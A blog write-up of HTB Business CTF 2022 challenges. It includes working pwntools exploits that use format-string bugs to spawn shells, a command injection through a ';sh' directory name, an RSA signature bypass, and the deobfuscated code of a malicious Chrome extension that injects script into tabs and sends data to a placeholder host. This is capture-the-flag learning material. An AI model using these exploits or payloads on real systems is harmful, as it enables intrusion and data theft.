{"@type":"BlogPosting","url":"https://ainset.in//htb-businessctf-2022.html","headline":"HTB Business CTF 2022 : Dirty Money write-up (in progress)","dateModified":"2022-07-18T17:30:00+09:00","datePublished":"2022-07-18T17:30:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ainset.in//htb-businessctf-2022.html"},"author":{"@type":"Person","name":"Ainsetin"},"description":"Write-up IN PROGRESS .. 작성중 Summary Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc.. Tasks Pwnable💻 Payback Insider OpenDoor Cryptography💡 BBGun06 (+ revenge) ElElGamal Reversing⚙️ BreakOut ChromeMiner, Assisted Forensic🔎 Lina’s Invitation PWN : Payback 1. Analyze mitigations are here: [*] &#39;/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b&#39;./.glibc/&#39; I found that delete_bot function has Format string bug when I send delete_reason. int delete_bot() { unsigned int id; id = getId(); // 0 ~ 31 if (botBuf[id].url != NULL) { char reasonbuf[MAX_REASON_SIZE]; memset(reasonbuf, &#39;\\x00&#39;, MAX_REASON_SIZE); // gather statistics printf(&quot;\\n[*] Enter the reason of deletion: &quot;); read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1); free(botBuf[id].url); botBuf[id].url = NULL; puts(&quot;\\n[+] Bot Deleted successfully! | Reason: &quot;); printf(reasonbuf); return 0; } puts(&quot;\\n[!] Error: Unable to fetch the requested bot entry.\\n&quot;); } reasonbuf is in a stack area so I can check FSB attack offset with input buffer. If I manage __free_hook, I can call system(&quot;/bin/sh\\x00&quot;) when I call delete_bot. Setting bot’s URL to /bin/sh\\x00 and calling free can trigger shell. Let’s exploit! 2. Exploit Code from pwn import * # p=process(&quot;./payback&quot;) p=remote(&quot;142.93.37.110&quot;,30669) e=ELF(&quot;./payback&quot;) l=ELF(&quot;.glibc/libc.so.6&quot;) def add(): p.sendlineafter(&quot;&gt;&gt; &quot;, str(1).encode()) p.sendlineafter(&quot;: &quot;, &quot;/bin/sh\\x00&quot;) p.sendlineafter(&quot;: &quot;, &quot;0&quot;) def delete(id, fsb_pay): p.sendlineafter(&quot;&gt;&gt; &quot;, str(3)) p.sendlineafter(&quot;: &quot;, str(id)) pause() p.sendafter(&quot;: &quot;, fsb_pay) add() delete(0, &quot;%p&quot;) # overwrite offset : 8 p.recvuntil(&quot;Reason: \\n&quot;) libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym[&#39;__free_hook&#39;] system = libc_base + l.sym[&#39;system&#39;] log.info(hex(libc_base)) log.info(hex(free_hook)) add() low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32 if mid &gt; low: rmid = mid-low else: rmid = 0x10000+mid-low if high &gt; mid: rhigh = high-mid else: rhigh = 0x10000+high-mid log.info(hex(low)) log.info(hex(mid)) log.info(hex(high)) payload = &#39;&#39; payload += &#39;%{}c&#39;.format(low) payload += &#39;%13$hn&#39; payload += &#39;%{}c&#39;.format(rmid) payload += &#39;%14$hn&#39; payload += &#39;%{}c&#39;.format(rhigh) payload += &#39;%15$hn&#39; payload += &#39;A&#39; payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4) delete(0, payload) add() delete(0, b&quot;pwned&quot;) p.interactive() Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}. PWN : Insider 1. Analyze Binary run FTP cli program with 30 commands. USER ;) : compare with ;) string, if it’s correct, prepare PASS command. PASS ;) : same with USER command, if password correct, I can use all of cmds. BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition. LIST : get current working directory (CWD) by using getcwd() function. also run ls -al [result of getcwd()] with popen. if process run successfully, result should be written in console. CWD [path] : change working directory with my own path. MKDR [path] : make directory with my own path. .. etc BKDR command can leak stack area or overwrite stack area. I found unchanged stack position that makes denied access to LIST command. (value : -1, LIST NOT ALLOWED!) at first, I used RETR command to read /flag.txt, but this file’s permission is only read in root, r--------. Need to find another way.. v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n. 2. After Getting shell..? MKDR ;sh : make directory named ;sh. it’s legal expression in linux. CWD ;sh : change working directory to /home/ctf/;sh LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!! In the shell, cd /home/ctf =&gt; I noticed that get_flag file’s RUNPATH is ./, so changing working directory to /home/ctf is necessary. In the shell, ./get_flag =&gt; Execute! In the shell, exit =&gt; for receiving results of entire commands. (because commands is running in popen process) 3. Exploit Code from pwn import * #context.log_level = &#39;debug&#39; p = remote(&quot;104.248.175.153&quot;,30467) #p = process(&#39;./chall&#39;) def qwer(x, noRecv=False): if not noRecv: p.recv() p.send(x) sleep(0.5) qwer(&quot;USER ;)&quot;) qwer(&quot;PASS ;)&quot;) qwer(&quot;BKDR %p %p %p %p %p %p %p&quot;) p.recvuntil(&quot;(nil) 0x&quot;) leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak)) pay = b&#39;BKDR&#39; pay += b&#39; %1035$n&#39; #pause() pay = pay.ljust(0x28-3, b&#39;b&#39;) pay += p64(leak) pay += b&quot;ASDF&quot; qwer(pay) #qwer(&quot;STOR .profile&quot;) #qwer(&quot;alias ls=&#39;sh;ls&#39;&quot;.ljust(0x1000, &#39;a&#39;) + &#39;LIST&#39;, True) #p.shutdown(&#39;send&#39;) qwer(&quot;MKDR ;sh&quot;) qwer(&quot;CWD ;sh&quot;) qwer(&quot;LIST&quot;) p.sendline(&quot;cd /home/ctf&quot;) p.sendline(&quot;./get_flag&quot;) p.sendline(&quot;exit&quot;) p.interactive() Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}. PWN : OpenDoor ! REDACTED ! Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb CRYPTO : BBGun06 1. Analyze BBGun06 / revenge has same verify(self,message, signature) code: def verify(self, message, signature): keylength = len(long_to_bytes(self.n)) decrypted = self.encrypt(signature) clearsig = decrypted.to_bytes(keylength, &quot;big&quot;) r = re.compile(b&#39;\\x00\\x01\\xff+?\\x00(.{15})(.{20})&#39;, re.DOTALL) m = r.match(clearsig) if not m: raise VerificationError(&#39;Verification failed&#39;) if m.group(1) != self.asn1: raise VerificationError(&#39;Verification failed&#39;) if m.group(2) != sha1(message).digest(): raise VerificationError(&#39;Verification failed&#39;) return True And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer. Decrypted message is same when I give bytes string that has same integer result. That means, dec(&quot;0001&quot;) == dec(&quot;01&quot;). It’s simple! send given signature with 00 :D, 00 + sig revenge prob has the same solving process lol:) See below. 2. Exploit (Manual) // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32&#39;06_519n47u23_f02932y} signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f ... Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32&#39;s} CRYPTO : ElElGamal I didn’t know about ElGamal in cryptography, so I searched a lot. writing… — REV : BreakOut 1. FLAG Recovering Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running! Download bkd file in website. Realize it’s web server made by C++. Find secretGet function and get flag. 2. Get FLAG Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}. REV : ChromeMiner Fully obfuscated js Challenge. 1. Recover with hand async function iF() { if (!(&#39;injected&#39; in document)) { document[&#39;injected&#39;] = true; window[&#39;setInterval&#39;](async () =&gt; { y = new window[&#39;Uint8Array&#39;](64); window[&#39;crypto&#39;][&#39;getRandomValues&#39;](y); if (new window[&#39;TextDecoder&#39;](&#39;utf-8&#39;)[&#39;decode&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;endsWith&#39;](&#39;chrome&#39;)) { j = new window[&#39;Uint8Array&#39;](y[&#39;byteLength&#39;] + (await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;byteLength&#39;]); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](y), 0); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y)), y[&#39;byteLength&#39;]); window[&#39;fetch&#39;](&#39;hxxps://qwertzuiop123.evil/&#39; + [...new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;encrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;decrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;decrypt&#39;]), new window[&#39;Uint8Array&#39;]((&#39;E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8&#39;)[&#39;match&#39;](/../g)[&#39;map&#39;](h =&gt; window[&#39;parseInt&#39;](h, 16)))), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;encrypt&#39;]), j))][&#39;map&#39;](x =&gt; x[&#39;toString&#39;](16)[&#39;padStart&#39;](2, &quot;0&quot;))[&#39;join&#39;](&quot;&quot;)); } }, 1); } } ; chrome[&#39;tabs&#39;][&#39;onUpdated&#39;][&#39;addListener&#39;]((tabVar, changeInfo, tab) =&gt; { if (&#39;url&#39; in tab &amp;&amp; tab[&#39;url&#39;] != null &amp;&amp; (tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;https://&#39;) || tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;http://&#39;))) { chrome[&#39;scripting&#39;][&#39;executeScript&#39;]({[&#39;target&#39;]: {[&#39;tabId&#39;]: tab[&#39;id&#39;]}, function: iF}); } }); 2. Decrypt with AES-256 &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &gt;&gt;&gt; cipher.decrypt(b&#39;\\xe2B\\xe6Ba\\xd2\\x19i\\xf6[\\xed\\xf9T\\x90\\n\\x99R\\t\\t\\x9f\\xb6\\xc3\\xc6\\x82\\xc0\\xd9\\xc4\\xb2u\\xb1\\xc2\\x12\\xbc\\x18\\x8e\\x08\\x82\\xb6\\xber\\xc7I!\\x12A\\x18\\x7f\\xa8&#39;) b&#39;HTB{__mY_vRy_owN_CHR0me_M1N3R__}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10&#39; FOR : Lina’s Invitation writing….","@context":"https://schema.org"}</script>
<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
<!-- End Jekyll SEO tag -->

  <link type="application/atom+xml" rel="alternate" href="https://ainset.in//feed.xml" title="Ainsetin 🇰🇷 ⚡" />

  <link rel="shortcut icon" href="https://ainset.in/favicon.ico" />
  <link rel="stylesheet" href="/assets/css/main.css" />
  
    <script type="text/javascript">
  window.addEventListener('load', themeChange);
  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
  if (currentTheme)
    document.documentElement.setAttribute('data-theme', currentTheme);

  function themeChange() {
    let button = document.querySelector('.theme-toggle');

    button.addEventListener('click', function (e) {
      let currentTheme = document.documentElement.getAttribute('data-theme');
      if (currentTheme === 'dark') {
        transition();
        document.documentElement.setAttribute('data-theme', 'light');
        localStorage.setItem('theme', 'light');
      } else {
        transition();
        document.documentElement.setAttribute('data-theme', 'dark');
        localStorage.setItem('theme', 'dark');
      }
      window.setTimeout(() => {
        disqus();
      }, 300);
    });

    let transition = () => {
      document.documentElement.classList.add('transition');
      window.setTimeout(() => {
        document.documentElement.classList.remove('transition');
      }, 200);
    }
  }
</script>


  

</head>
<body>
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">home..</a>
<h1 class="post-title">HTB Business CTF 2022 : Dirty Money write-up (in progress)</h1>
<p class="post-date text-bold text-upcase">
  
    <span>2022/07/18  5:30 PM</span>
    <span style="float: right;">Author : Ainsetin</span>
  
</p>

<div class="soopr-btn"
   data-twitter="ainsetin"
>
</div>

<p><strong>Write-up IN PROGRESS ..</strong><br />
작성중</p>

<h2 id="summary">Summary</h2>
<p>Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc..</p>

<h2 id="tasks">Tasks</h2>

<ul>
  <li>Pwnable💻
    <ul>
      <li><a href="#pwn--payback">Payback</a></li>
      <li><a href="#pwn--insider">Insider</a></li>
      <li><a href="#pwn--opendoor">OpenDoor</a></li>
    </ul>
  </li>
  <li>Cryptography💡
    <ul>
      <li><a href="#crypto--bbgun06">BBGun06 (+ revenge)</a></li>
      <li><a href="#crypto--elelgamal">ElElGamal</a></li>
    </ul>
  </li>
  <li>Reversing⚙️
    <ul>
      <li><a href="#rev--breakout">BreakOut</a></li>
      <li><a href="#rev--chromeminer">ChromeMiner, Assisted</a></li>
    </ul>
  </li>
  <li>Forensic🔎
    <ul>
      <li><a href="#for--linas-invitation">Lina’s Invitation</a></li>
    </ul>
  </li>
</ul>

<h2 id="pwn--payback">PWN : Payback</h2>

<h3 id="1-analyze">1. Analyze</h3>
<p>mitigations are here:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b<span class="s1">'./.glibc/'</span>
</code></pre></div></div>
<p>I found that <code class="language-plaintext highlighter-rouge">delete_bot</code> function has Format string bug when I send delete_reason.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">delete_bot</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">id</span> <span class="o">=</span> <span class="n">getId</span><span class="p">();</span> <span class="c1">// 0 ~ 31</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">char</span> <span class="n">reasonbuf</span><span class="p">[</span><span class="n">MAX_REASON_SIZE</span><span class="p">];</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="sc">'\x00'</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span><span class="p">);</span>
        <span class="c1">// gather statistics</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] Enter the reason of deletion: "</span><span class="p">);</span>
        <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reasonbuf</span><span class="p">,</span> <span class="n">MAX_REASON_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span><span class="p">);</span>
        <span class="n">botBuf</span><span class="p">[</span><span class="n">id</span><span class="p">].</span><span class="n">url</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Bot Deleted successfully! | Reason: "</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="n">reasonbuf</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Error: Unable to fetch the requested bot entry.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">reasonbuf</code> is in a stack area so I can check FSB attack offset with input buffer.<br />
If I manage <code class="language-plaintext highlighter-rouge">__free_hook</code>, I can call <code class="language-plaintext highlighter-rouge">system("/bin/sh\x00")</code> when I call <code class="language-plaintext highlighter-rouge">delete_bot</code>.<br />
Setting bot’s URL to <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> and calling free can trigger shell.<br />
Let’s exploit!</p>

<h3 id="2-exploit-code">2. Exploit Code</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># p=process("./payback")
</span><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"142.93.37.110"</span><span class="p">,</span><span class="mi">30669</span><span class="p">)</span>
<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./payback"</span><span class="p">)</span>
<span class="n">l</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">".glibc/libc.so.6"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
    <span class="n">pause</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">fsb_pay</span><span class="p">)</span>

<span class="n">add</span><span class="p">()</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"%p"</span><span class="p">)</span>
<span class="c1"># overwrite offset : 8
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Reason: </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1ed723</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="n">add</span><span class="p">()</span>

<span class="n">low</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">high</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span>

<span class="k">if</span> <span class="n">mid</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
    <span class="n">rmid</span> <span class="o">=</span> <span class="n">mid</span><span class="o">-</span><span class="n">low</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">rmid</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">mid</span><span class="o">-</span><span class="n">low</span>

<span class="k">if</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">mid</span><span class="p">:</span>
    <span class="n">rhigh</span> <span class="o">=</span> <span class="n">high</span><span class="o">-</span><span class="n">mid</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">rhigh</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="o">+</span><span class="n">high</span><span class="o">-</span><span class="n">mid</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">low</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">mid</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">high</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%{}c'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">low</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%13$hn'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%{}c'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">rmid</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%14$hn'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%{}c'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">rhigh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'%15$hn'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'A'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="c1">#print(len(payload))
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">add</span><span class="p">()</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">b"pwned"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><img src="/images/2022-htb_businessctf/1.png" alt="1.png" /></p>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}</code>.</p>

<hr />

<h2 id="pwn--insider">PWN : Insider</h2>

<h3 id="1-analyze-1">1. Analyze</h3>
<p>Binary run FTP cli program with 30 commands.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">USER ;)</code> : compare with <code class="language-plaintext highlighter-rouge">;)</code> string, if it’s correct, prepare <code class="language-plaintext highlighter-rouge">PASS</code> command.</li>
  <li><code class="language-plaintext highlighter-rouge">PASS ;)</code> : same with <code class="language-plaintext highlighter-rouge">USER</code> command, if password correct, I can use all of cmds.</li>
  <li><code class="language-plaintext highlighter-rouge">BKDR [payload]</code> : short expression of <code class="language-plaintext highlighter-rouge">backdoor</code> I think, it can be attacked by FSB with limited condition.</li>
  <li><code class="language-plaintext highlighter-rouge">LIST</code> : get current working directory (CWD) by using <code class="language-plaintext highlighter-rouge">getcwd()</code> function.<br />
also run <code class="language-plaintext highlighter-rouge">ls -al [result of getcwd()]</code> with <code class="language-plaintext highlighter-rouge">popen</code>.<br />
if process run successfully, result should be written in console.</li>
  <li><code class="language-plaintext highlighter-rouge">CWD [path]</code> : change working directory with my own path.</li>
  <li><code class="language-plaintext highlighter-rouge">MKDR [path]</code> : make directory with my own path.</li>
  <li>.. etc</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">BKDR</code> command can leak stack area or overwrite stack area.<br />
I found unchanged stack position that makes denied access to <code class="language-plaintext highlighter-rouge">LIST</code> command.<br />
(value : -1, <code class="language-plaintext highlighter-rouge">LIST</code> NOT ALLOWED!)</p>

<p>at first, I used <code class="language-plaintext highlighter-rouge">RETR</code> command to read <code class="language-plaintext highlighter-rouge">/flag.txt</code>, but this file’s permission is only <code class="language-plaintext highlighter-rouge">read in root</code>, <code class="language-plaintext highlighter-rouge">r--------</code>.
Need to find another way..</p>

